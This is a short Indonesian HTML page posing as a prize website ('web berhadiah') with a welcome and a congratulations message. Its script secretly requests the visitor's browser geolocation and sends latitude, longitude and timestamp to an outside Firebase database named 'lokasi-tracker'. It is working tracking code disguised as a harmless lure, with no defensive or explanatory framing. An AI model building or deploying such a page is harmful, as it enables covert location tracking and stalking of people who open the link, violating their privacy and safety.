<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>web berhadiah...</title>

<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

</head>
<body>

<h2>Hello selamat datang</h2>

<script>

// CONFIG FIREBASE
const firebaseConfig = {
databaseURL: "https://lokasi-tracker-43400-default-rtdb.asia-southeast1.firebasedatabase.app/"
};

firebase.initializeApp(firebaseConfig);

const db = firebase.database();

// ambil lokasi user
navigator.geolocation.getCurrentPosition(function(position){

const lat = position.coords.latitude;
const lng = position.coords.longitude;

db.ref("locations").push({
latitude: lat,
longitude: lng,
time: new Date().toLocaleString()
});

document.body.innerHTML = "<h2>selamat  ✅</h2>";

},
function(){
document.body.innerHTML = "<h2>User menolak akses lokasi ❌</h2>";
});

</script>

</body>
</html>
